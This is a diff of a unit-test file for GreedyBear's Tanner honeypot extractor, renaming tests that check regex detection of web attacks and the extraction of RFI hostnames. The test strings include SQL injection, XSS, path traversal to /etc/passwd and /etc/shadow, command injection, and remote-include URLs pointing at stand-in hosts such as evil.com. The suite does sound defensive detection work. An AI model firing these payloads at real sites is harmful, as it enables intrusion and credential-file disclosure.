@@ -7,7 +7,6 @@ from greedybear.cronjobs.extraction.strategies.tanner import (
     TANNER_SOURCE,
     TannerExtractionStrategy,
 )
-from greedybear.models import Tag
 
 from . import ExtractionTestCase
 
@@ -21,13 +20,9 @@ class TestTannerExtractionStrategy(ExtractionTestCase):
             sensor_repo=self.mock_sensor_repo,
         )
 
-    # ------------------------------------------------------------------
-    # Scanner extraction (reuses iocs_from_hits like all other strategies)
-    # ------------------------------------------------------------------
-
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
     @patch("greedybear.cronjobs.extraction.strategies.tanner.threatfox_submission")
-    def test_extracts_scanner_ips(self, mock_threatfox, mock_iocs_from_hits):
+    def test_extract_scanner_ips(self, mock_threatfox, mock_iocs_from_hits):
         mock_ioc = self._create_mock_ioc("1.2.3.4")
         mock_iocs_from_hits.return_value = [mock_ioc]
         self.strategy.ioc_processor.add_ioc = Mock(return_value=mock_ioc)
@@ -36,14 +31,12 @@ class TestTannerExtractionStrategy(ExtractionTestCase):
         self.strategy.extract_from_hits(hits)
 
         mock_iocs_from_hits.assert_called_once_with(hits)
-        self.strategy.ioc_processor.add_ioc.assert_any_call(
-            mock_ioc, attack_type=SCANNER, general_honeypot_name=TANNER_HONEYPOT
-        )
+        self.strategy.ioc_processor.add_ioc.assert_any_call(mock_ioc, attack_type=SCANNER, general_honeypot_name=TANNER_HONEYPOT)
         self.assertEqual(len(self.strategy.ioc_records), 1)
         mock_threatfox.assert_called_once()
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
-    def test_handles_none_ioc_record(self, mock_iocs_from_hits):
+    def test_none_ioc_record_skipped(self, mock_iocs_from_hits):
         mock_ioc = self._create_mock_ioc()
         mock_iocs_from_hits.return_value = [mock_ioc]
         self.strategy.ioc_processor.add_ioc = Mock(return_value=None)
@@ -55,7 +48,7 @@ class TestTannerExtractionStrategy(ExtractionTestCase):
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
     @patch("greedybear.cronjobs.extraction.strategies.tanner.threatfox_submission")
-    def test_extracts_multiple_scanners(self, mock_threatfox, mock_iocs_from_hits):
+    def test_multiple_scanners(self, mock_threatfox, mock_iocs_from_hits):
         ioc1 = self._create_mock_ioc("1.2.3.4")
         ioc2 = self._create_mock_ioc("5.6.7.8")
         mock_iocs_from_hits.return_value = [ioc1, ioc2]
@@ -71,8 +64,6 @@ class TestTannerExtractionStrategy(ExtractionTestCase):
 
 
 class TestTannerAttackDetection(ExtractionTestCase):
-    """Test the regex-based attack classification engine."""
-
     def setUp(self):
         super().setUp()
         self.strategy = TannerExtractionStrategy(
@@ -81,103 +72,98 @@ class TestTannerAttackDetection(ExtractionTestCase):
             sensor_repo=self.mock_sensor_repo,
         )
 
-    # ------------------------------------------------------------------
-    # _detect_attack_types
-    # ------------------------------------------------------------------
-
-    def test_detects_sqli_union_select(self):
+    def test_sqli_union_select(self):
         text = "/search?q=1 UNION SELECT username, password FROM users--"
         result = self.strategy._detect_attack_types(text)
         self.assertIn("sqli", result)
 
-    def test_detects_sqli_or_bypass(self):
+    def test_sqli_or_bypass(self):
         text = "/login?user=admin' OR '1'='1"
         result = self.strategy._detect_attack_types(text)
         self.assertIn("sqli", result)
 
-    def test_detects_sqli_sleep(self):
+    def test_sqli_sleep(self):
         text = "/page?id=1; SLEEP(5)--"
         result = self.strategy._detect_attack_types(text)
         self.assertIn("sqli", result)
 
-    def test_detects_sqli_information_schema(self):
+    def test_sqli_information_schema(self):
         text = "/page?id=1 UNION SELECT table_name FROM information_schema.tables"
         result = self.strategy._detect_attack_types(text)
         self.assertIn("sqli", result)
 
-    def test_detects_xss_script_tag(self):
+    def test_xss_script_tag(self):
         text = "/comment?body=<script>alert('xss')</script>"
         result = self.strategy._detect_attack_types(text)
         self.assertIn("xss", result)
 
-    def test_detects_xss_event_handler(self):
-        text = '/page?q=<img onerror=alert(1) src=x>'
+    def test_xss_event_handler(self):
+        text = "/page?q=<img onerror=alert(1) src=x>"
         result = self.strategy._detect_attack_types(text)
         self.assertIn("xss", result)
 
-    def test_detects_xss_javascript_protocol(self):
+    def test_xss_javascript_protocol(self):
         text = "/redirect?url=javascript:alert(document.cookie)"
         result = self.strategy._detect_attack_types(text)
         self.assertIn("xss", result)
 
-    def test_detects_lfi_path_traversal(self):
+    def test_lfi_path_traversal(self):
         text = "/page?file=../../../etc/passwd"
         result = self.strategy._detect_attack_types(text)
         self.assertIn("lfi", result)
 
-    def test_detects_lfi_proc_self(self):
+    def test_lfi_proc_self(self):
         text = "/read?path=/proc/self/environ"
         result = self.strategy._detect_attack_types(text)
         self.assertIn("lfi", result)
 
-    def test_detects_lfi_php_wrapper(self):
+    def test_lfi_php_wrapper(self):
         text = "/include?page=php://filter/convert.base64-encode/resource=index.php"
         result = self.strategy._detect_attack_types(text)
         self.assertIn("lfi", result)
 
-    def test_detects_rfi_include_url(self):
+    def test_rfi_include_url(self):
         text = "/page?file=include http://evil.com/shell.php"
         result = self.strategy._detect_attack_types(text)
         self.assertIn("rfi", result)
 
-    def test_detects_rfi_remote_php(self):
+    def test_rfi_remote_php(self):
         text = "/page?file=http://evil.com/backdoor.php"
         result = self.strategy._detect_attack_types(text)
         self.assertIn("rfi", result)
 
-    def test_detects_cmd_injection_semicolon(self):
+    def test_cmd_injection_semicolon(self):
         text = "/ping?host=127.0.0.1; cat /etc/passwd"
         result = self.strategy._detect_attack_types(text)
         self.assertIn("cmd_injection", result)
 
-    def test_detects_cmd_injection_pipe(self):
+    def test_cmd_injection_pipe(self):
         text = "/dns?host=example.com | id"
         result = self.strategy._detect_attack_types(text)
         self.assertIn("cmd_injection", result)
 
-    def test_detects_cmd_injection_backtick(self):
+    def test_cmd_injection_backtick(self):
         text = "/page?name=`whoami`"
         result = self.strategy._detect_attack_types(text)
         self.assertIn("cmd_injection", result)
 
-    def test_detects_cmd_injection_dollar_paren(self):
+    def test_cmd_injection_subshell(self):
         text = "/page?q=$(cat /etc/passwd)"
         result = self.strategy._detect_attack_types(text)
         self.assertIn("cmd_injection", result)
 
-    def test_detects_multiple_attack_types(self):
-        """A single request can match multiple attack types."""
+    def test_multiple_attack_types_in_one_request(self):
         text = "/page?file=../../../etc/passwd&q=<script>alert(1)</script>"
         result = self.strategy._detect_attack_types(text)
         self.assertIn("lfi", result)
         self.assertIn("xss", result)
 
-    def test_no_attack_for_benign_request(self):
+    def test_benign_request_no_match(self):
         text = "/index.html?page=about&lang=en"
         result = self.strategy._detect_attack_types(text)
         self.assertEqual(result, [])
 
-    def test_no_attack_for_empty_text(self):
+    def test_empty_text_no_match(self):
         result = self.strategy._detect_attack_types("")
         self.assertEqual(result, [])
 
@@ -191,45 +177,43 @@ class TestTannerRequestTextExtraction(ExtractionTestCase):
             sensor_repo=self.mock_sensor_repo,
         )
 
-    def test_extracts_url_field(self):
+    def test_url_field(self):
         hit = {"url": "/search?q=test", "src_ip": "1.2.3.4"}
         text = self.strategy._extract_request_text(hit)
         self.assertIn("/search?q=test", text)
 
-    def test_extracts_path_field(self):
+    def test_path_field_fallback(self):
         hit = {"path": "/api/data", "src_ip": "1.2.3.4"}
         text = self.strategy._extract_request_text(hit)
         self.assertIn("/api/data", text)
 
-    def test_extracts_post_data(self):
+    def test_post_data_included(self):
         hit = {"url": "/login", "post_data": "user=admin&pass=test", "src_ip": "1.2.3.4"}
         text = self.strategy._extract_request_text(hit)
         self.assertIn("user=admin&pass=test", text)
 
-    def test_extracts_body_field(self):
+    def test_body_field_included(self):
         hit = {"url": "/api", "body": '{"key": "value"}', "src_ip": "1.2.3.4"}
         text = self.strategy._extract_request_text(hit)
         self.assertIn('{"key": "value"}', text)
 
-    def test_url_decoding(self):
+    def test_url_encoded_payload_decoded(self):
         hit = {"url": "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", "src_ip": "1.2.3.4"}
         text = self.strategy._extract_request_text(hit)
         self.assertIn("<script>alert(1)</script>", text)
 
-    def test_empty_hit(self):
+    def test_empty_hit_returns_empty(self):
         hit = {"src_ip": "1.2.3.4"}
         text = self.strategy._extract_request_text(hit)
         self.assertEqual(text, "")
 
-    def test_url_preferred_over_path(self):
+    def test_url_takes_precedence_over_path(self):
         hit = {"url": "/from-url", "path": "/from-path", "src_ip": "1.2.3.4"}
         text = self.strategy._extract_request_text(hit)
         self.assertIn("/from-url", text)
 
 
 class TestTannerAttackClassification(ExtractionTestCase):
-    """Test the full _classify_attacks flow with tag creation."""
-
     def setUp(self):
         super().setUp()
         self.strategy = TannerExtractionStrategy(
@@ -240,7 +224,7 @@ class TestTannerAttackClassification(ExtractionTestCase):
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
     @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
-    def test_classify_creates_tags_for_sqli(self, mock_tag_objects, mock_iocs_from_hits):
+    def test_sqli_tagged(self, mock_tag_objects, mock_iocs_from_hits):
         mock_iocs_from_hits.return_value = []
         mock_ioc_record = self._create_mock_ioc("1.2.3.4")
         self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
@@ -258,7 +242,7 @@ class TestTannerAttackClassification(ExtractionTestCase):
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
     @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
-    def test_classify_creates_multiple_tags(self, mock_tag_objects, mock_iocs_from_hits):
+    def test_mixed_attacks_produce_multiple_tags(self, mock_tag_objects, mock_iocs_from_hits):
         mock_iocs_from_hits.return_value = []
         mock_ioc_record = self._create_mock_ioc("1.2.3.4")
         self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
@@ -273,7 +257,7 @@ class TestTannerAttackClassification(ExtractionTestCase):
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
     @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
-    def test_classify_skips_benign_requests(self, mock_tag_objects, mock_iocs_from_hits):
+    def test_benign_request_no_tags(self, mock_tag_objects, mock_iocs_from_hits):
         mock_iocs_from_hits.return_value = []
         hits = [{"src_ip": "1.2.3.4", "url": "/index.html?page=about"}]
         self.strategy.extract_from_hits(hits)
@@ -281,7 +265,7 @@ class TestTannerAttackClassification(ExtractionTestCase):
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
     @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
-    def test_classify_skips_hit_without_src_ip(self, mock_tag_objects, mock_iocs_from_hits):
+    def test_missing_src_ip_skipped(self, mock_tag_objects, mock_iocs_from_hits):
         mock_iocs_from_hits.return_value = []
         hits = [{"url": "/page?id=1 UNION SELECT *"}]
         self.strategy.extract_from_hits(hits)
@@ -289,7 +273,7 @@ class TestTannerAttackClassification(ExtractionTestCase):
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
     @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
-    def test_classify_skips_unknown_scanner_ip(self, mock_tag_objects, mock_iocs_from_hits):
+    def test_unknown_scanner_ip_skipped(self, mock_tag_objects, mock_iocs_from_hits):
         mock_iocs_from_hits.return_value = []
         self.mock_ioc_repo.get_ioc_by_name.return_value = None
         hits = [{"src_ip": "9.9.9.9", "url": "/page?id=1 UNION SELECT *"}]
@@ -298,7 +282,7 @@ class TestTannerAttackClassification(ExtractionTestCase):
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
     @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
-    def test_tag_counter_increments(self, mock_tag_objects, mock_iocs_from_hits):
+    def test_new_tag_increments_counter(self, mock_tag_objects, mock_iocs_from_hits):
         mock_iocs_from_hits.return_value = []
         mock_ioc_record = self._create_mock_ioc("1.2.3.4")
         self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
@@ -311,11 +295,10 @@ class TestTannerAttackClassification(ExtractionTestCase):
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
     @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
-    def test_duplicate_tag_not_counted(self, mock_tag_objects, mock_iocs_from_hits):
+    def test_existing_tag_not_counted(self, mock_tag_objects, mock_iocs_from_hits):
         mock_iocs_from_hits.return_value = []
         mock_ioc_record = self._create_mock_ioc("1.2.3.4")
         self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
-        # get_or_create returns created=False for existing tag
         mock_tag_objects.get_or_create.return_value = (Mock(), False)
 
         hits = [{"src_ip": "1.2.3.4", "url": "/page?id=1 UNION SELECT *"}]
@@ -325,8 +308,6 @@ class TestTannerAttackClassification(ExtractionTestCase):
 
 
 class TestTannerRfiExtraction(ExtractionTestCase):
-    """Test RFI hostname extraction as PAYLOAD_REQUEST IOCs."""
-
     def setUp(self):
         super().setUp()
         self.strategy = TannerExtractionStrategy(
@@ -338,7 +319,7 @@ class TestTannerRfiExtraction(ExtractionTestCase):
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
     @patch("greedybear.cronjobs.extraction.strategies.tanner.threatfox_submission")
     @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
-    def test_rfi_creates_payload_request_ioc(self, mock_tag_objects, mock_threatfox, mock_iocs_from_hits):
+    def test_rfi_hostname_as_payload_request(self, mock_tag_objects, mock_threatfox, mock_iocs_from_hits):
         mock_iocs_from_hits.return_value = []
         mock_ioc_record = self._create_mock_ioc("1.2.3.4")
         self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
@@ -351,12 +332,7 @@ class TestTannerRfiExtraction(ExtractionTestCase):
         hits = [{"src_ip": "1.2.3.4", "url": "/page?file=include http://evil.com/shell.php"}]
         self.strategy.extract_from_hits(hits)
 
-        # Verify PAYLOAD_REQUEST IOC was created for the RFI hostname
-        payload_calls = [
-            call
-            for call in self.strategy.ioc_processor.add_ioc.call_args_list
-            if call[1].get("attack_type") == PAYLOAD_REQUEST
-        ]
+        payload_calls = [call for call in self.strategy.ioc_processor.add_ioc.call_args_list if call[1].get("attack_type") == PAYLOAD_REQUEST]
         self.assertEqual(len(payload_calls), 1)
         self.assertEqual(payload_calls[0][0][0].name, "evil.com")
         self.assertEqual(payload_calls[0][1]["general_honeypot_name"], TANNER_HONEYPOT)
@@ -380,13 +356,12 @@ class TestTannerRfiExtraction(ExtractionTestCase):
         hits = [{"src_ip": "1.2.3.4", "url": "/page?file=include http://evil.com/shell.php"}]
         self.strategy.extract_from_hits(hits)
 
-        # _add_fks should link both IOCs
         scanner_record.related_ioc.add.assert_called_with(hostname_record)
         hostname_record.related_ioc.add.assert_called_with(scanner_record)
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
     @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
-    def test_rfi_deduplicates_hostnames(self, mock_tag_objects, mock_iocs_from_hits):
+    def test_rfi_same_hostname_deduplicated(self, mock_tag_objects, mock_iocs_from_hits):
         mock_iocs_from_hits.return_value = []
         mock_ioc_record = self._create_mock_ioc("1.2.3.4")
         self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
@@ -395,23 +370,16 @@ class TestTannerRfiExtraction(ExtractionTestCase):
         rfi_ioc = self._create_mock_ioc("evil.com", ioc_type="domain")
         self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc)
 
-        # Two different URLs pointing to the same hostname
-        hits = [
-            {"src_ip": "1.2.3.4", "url": "/a?file=include http://evil.com/shell.php&b=include http://evil.com/backdoor.php"}
-        ]
+        # Two URLs with the same hostname in one request
+        hits = [{"src_ip": "1.2.3.4", "url": "/a?file=include http://evil.com/shell.php&b=include http://evil.com/backdoor.php"}]
         self.strategy.extract_from_hits(hits)
 
-        # add_ioc should be called only once for the hostname (deduplicated)
-        payload_calls = [
-            call
-            for call in self.strategy.ioc_processor.add_ioc.call_args_list
-            if call[1].get("attack_type") == PAYLOAD_REQUEST
-        ]
+        payload_calls = [call for call in self.strategy.ioc_processor.add_ioc.call_args_list if call[1].get("attack_type") == PAYLOAD_REQUEST]
         self.assertEqual(len(payload_calls), 1)
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
     @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
-    def test_rfi_counter_increments(self, mock_tag_objects, mock_iocs_from_hits):
+    def test_rfi_counter(self, mock_tag_objects, mock_iocs_from_hits):
         mock_iocs_from_hits.return_value = []
         mock_ioc_record = self._create_mock_ioc("1.2.3.4")
         self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
@@ -427,7 +395,7 @@ class TestTannerRfiExtraction(ExtractionTestCase):
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
     @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
-    def test_rfi_handles_invalid_url(self, mock_tag_objects, mock_iocs_from_hits):
+    def test_rfi_invalid_url_no_crash(self, mock_tag_objects, mock_iocs_from_hits):
         mock_iocs_from_hits.return_value = []
         mock_ioc_record = self._create_mock_ioc("1.2.3.4")
         self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
@@ -438,12 +406,11 @@ class TestTannerRfiExtraction(ExtractionTestCase):
         hits = [{"src_ip": "1.2.3.4", "url": "/page?file=include http:///shell.php"}]
         self.strategy.extract_from_hits(hits)
 
-        # Should not crash; RFI counter should stay 0 since hostname is empty
         self.assertEqual(self.strategy.rfi_hostnames_added, 0)
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
     @patch("greedybear.cronjobs.extraction.strategies.tanner.Tag.objects")
-    def test_rfi_attaches_sensor(self, mock_tag_objects, mock_iocs_from_hits):
+    def test_rfi_sensor_attached_to_ioc(self, mock_tag_objects, mock_iocs_from_hits):
         mock_iocs_from_hits.return_value = []
         mock_ioc_record = self._create_mock_ioc("1.2.3.4")
         self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
@@ -458,7 +425,6 @@ class TestTannerRfiExtraction(ExtractionTestCase):
         hits = [{"src_ip": "1.2.3.4", "url": "/page?file=include http://evil.com/shell.php", "_sensor": mock_sensor}]
         self.strategy.extract_from_hits(hits)
 
-        # Verify the IOC passed to add_ioc had the sensor attached
         call_args = self.strategy.ioc_processor.add_ioc.call_args_list
         payload_calls = [c for c in call_args if c[1].get("attack_type") == PAYLOAD_REQUEST]
         self.assertEqual(len(payload_calls), 1)
@@ -467,8 +433,6 @@ class TestTannerRfiExtraction(ExtractionTestCase):
 
 
 class TestTannerAddFks(ExtractionTestCase):
-    """Test bidirectional IOC linking for RFI."""
-
     def setUp(self):
         super().setUp()
         self.strategy = TannerExtractionStrategy(
@@ -477,7 +441,7 @@ class TestTannerAddFks(ExtractionTestCase):
             sensor_repo=self.mock_sensor_repo,
         )
 
-    def test_links_scanner_and_hostname(self):
+    def test_add_fks_both_exist(self):
         scanner = self._create_mock_ioc("1.2.3.4")
         hostname = self._create_mock_ioc("evil.com", ioc_type="domain")
 
@@ -492,7 +456,7 @@ class TestTannerAddFks(ExtractionTestCase):
         hostname.related_ioc.add.assert_called_once_with(scanner)
         self.assertEqual(self.mock_ioc_repo.save.call_count, 2)
 
-    def test_skips_when_scanner_missing(self):
+    def test_add_fks_scanner_none(self):
         hostname = self._create_mock_ioc("evil.com", ioc_type="domain")
         self.mock_ioc_repo.get_ioc_by_name.side_effect = lambda name: {
             "evil.com": hostname,
@@ -502,7 +466,7 @@ class TestTannerAddFks(ExtractionTestCase):
 
         hostname.related_ioc.add.assert_not_called()
 
-    def test_skips_when_hostname_missing(self):
+    def test_add_fks_hostname_none(self):
         scanner = self._create_mock_ioc("1.2.3.4")
         self.mock_ioc_repo.get_ioc_by_name.side_effect = lambda name: {
             "1.2.3.4": scanner,
@@ -514,15 +478,10 @@ class TestTannerAddFks(ExtractionTestCase):
 
 
 class TestTannerAttackPatterns(ExtractionTestCase):
-    """
-    Direct validation of TANNER_ATTACK_PATTERNS regexes.
-    Ensures each pattern matches known attack payloads and does not
-    false-positive on benign input.
-    """
+    """Validates TANNER_ATTACK_PATTERNS regexes against known payloads."""
 
-    # ---- SQLi ----
-    def test_sqli_matches(self):
-        sqli_payloads = [
+    def test_sqli_payloads(self):
+        payloads = [
             "1 UNION SELECT * FROM users",
             "admin' OR '1'='1",
             "1; DROP TABLE users",
@@ -531,44 +490,33 @@ class TestTannerAttackPatterns(ExtractionTestCase):
             "1 AND 1=1 UNION SELECT table_name FROM information_schema.tables",
             "/* bypass */ 1=1",
         ]
-        for payload in sqli_payloads:
-            self.assertIsNotNone(TANNER_ATTACK_PATTERNS["sqli"].search(payload), f"SQLi missed: {payload}")
+        for p in payloads:
+            self.assertIsNotNone(TANNER_ATTACK_PATTERNS["sqli"].search(p), f"SQLi missed: {p}")
 
-    def test_sqli_no_false_positive(self):
-        benign = [
-            "/about",
-            "/users/123",
-            "Hello world",
-            "SELECT a nice day",
-        ]
-        for text in benign:
-            self.assertIsNone(TANNER_ATTACK_PATTERNS["sqli"].search(text), f"SQLi false positive: {text}")
+    def test_sqli_benign(self):
+        benign = ["/about", "/users/123", "Hello world", "SELECT a nice day"]
+        for t in benign:
+            self.assertIsNone(TANNER_ATTACK_PATTERNS["sqli"].search(t), f"SQLi false positive: {t}")
 
-    # ---- XSS ----
-    def test_xss_matches(self):
-        xss_payloads = [
+    def test_xss_payloads(self):
+        payloads = [
             "<script>alert(1)</script>",
             "javascript:alert(document.cookie)",
-            '<img onerror=alert(1) src=x>',
-            '<svg onload=alert(1)>',
+            "<img onerror=alert(1) src=x>",
+            "<svg onload=alert(1)>",
             "eval('malicious')",
             "document.write('xss')",
         ]
-        for payload in xss_payloads:
-            self.assertIsNotNone(TANNER_ATTACK_PATTERNS["xss"].search(payload), f"XSS missed: {payload}")
+        for p in payloads:
+            self.assertIsNotNone(TANNER_ATTACK_PATTERNS["xss"].search(p), f"XSS missed: {p}")
 
-    def test_xss_no_false_positive(self):
-        benign = [
-            "/about",
-            "Just a normal text with <b>bold</b>",
-            "Buy scripts and novels",
-        ]
-        for text in benign:
-            self.assertIsNone(TANNER_ATTACK_PATTERNS["xss"].search(text), f"XSS false positive: {text}")
+    def test_xss_benign(self):
+        benign = ["/about", "Just a normal text with <b>bold</b>", "Buy scripts and novels"]
+        for t in benign:
+            self.assertIsNone(TANNER_ATTACK_PATTERNS["xss"].search(t), f"XSS false positive: {t}")
 
-    # ---- LFI ----
-    def test_lfi_matches(self):
-        lfi_payloads = [
+    def test_lfi_payloads(self):
+        payloads = [
             "../../../etc/passwd",
             "....//....//etc/shadow",
             "/proc/self/environ",
@@ -576,41 +524,31 @@ class TestTannerAttackPatterns(ExtractionTestCase):
             "data://text/plain;base64,PD9waHAgc3lzdGVtK",
             "expect://id",
         ]
-        for payload in lfi_payloads:
-            self.assertIsNotNone(TANNER_ATTACK_PATTERNS["lfi"].search(payload), f"LFI missed: {payload}")
+        for p in payloads:
+            self.assertIsNotNone(TANNER_ATTACK_PATTERNS["lfi"].search(p), f"LFI missed: {p}")
 
-    def test_lfi_no_false_positive(self):
-        benign = [
-            "/images/photo.jpg",
-            "/api/v2/data",
-            "normal filepath.txt",
-        ]
-        for text in benign:
-            self.assertIsNone(TANNER_ATTACK_PATTERNS["lfi"].search(text), f"LFI false positive: {text}")
+    def test_lfi_benign(self):
+        benign = ["/images/photo.jpg", "/api/v2/data", "normal filepath.txt"]
+        for t in benign:
+            self.assertIsNone(TANNER_ATTACK_PATTERNS["lfi"].search(t), f"LFI false positive: {t}")
 
-    # ---- RFI ----
-    def test_rfi_matches(self):
-        rfi_payloads = [
+    def test_rfi_payloads(self):
+        payloads = [
             "include http://evil.com/shell.php",
             "file=https://attacker.net/backdoor.txt",
             "require http://evil.com/payload.asp",
             "http://badsite.org/malware.cgi",
         ]
-        for payload in rfi_payloads:
-            self.assertIsNotNone(TANNER_ATTACK_PATTERNS["rfi"].search(payload), f"RFI missed: {payload}")
+        for p in payloads:
+            self.assertIsNotNone(TANNER_ATTACK_PATTERNS["rfi"].search(p), f"RFI missed: {p}")
 
-    def test_rfi_no_false_positive(self):
-        benign = [
-            "/about",
-            "Visit our website",
-            "file=report.pdf",
-        ]
-        for text in benign:
-            self.assertIsNone(TANNER_ATTACK_PATTERNS["rfi"].search(text), f"RFI false positive: {text}")
+    def test_rfi_benign(self):
+        benign = ["/about", "Visit our website", "file=report.pdf"]
+        for t in benign:
+            self.assertIsNone(TANNER_ATTACK_PATTERNS["rfi"].search(t), f"RFI false positive: {t}")
 
-    # ---- Command Injection ----
-    def test_cmd_injection_matches(self):
-        cmd_payloads = [
+    def test_cmd_injection_payloads(self):
+        payloads = [
             "; cat /etc/passwd",
             "| id",
             "&& whoami",
@@ -619,21 +557,16 @@ class TestTannerAttackPatterns(ExtractionTestCase):
             "/bin/sh -c id",
             "> /tmp/output",
         ]
-        for payload in cmd_payloads:
+        for p in payloads:
             self.assertIsNotNone(
-                TANNER_ATTACK_PATTERNS["cmd_injection"].search(payload),
-                f"CmdInj missed: {payload}",
+                TANNER_ATTACK_PATTERNS["cmd_injection"].search(p),
+                f"CmdInj missed: {p}",
             )
 
-    def test_cmd_injection_no_false_positive(self):
-        benign = [
-            "/about",
-            "Hello world",
-            "normal text here",
-            "price: $100",
-        ]
-        for text in benign:
+    def test_cmd_injection_benign(self):
+        benign = ["/about", "Hello world", "normal text here", "price: $100"]
+        for t in benign:
             self.assertIsNone(
-                TANNER_ATTACK_PATTERNS["cmd_injection"].search(text),
-                f"CmdInj false positive: {text}",
+                TANNER_ATTACK_PATTERNS["cmd_injection"].search(t),
+                f"CmdInj false positive: {t}",
             )
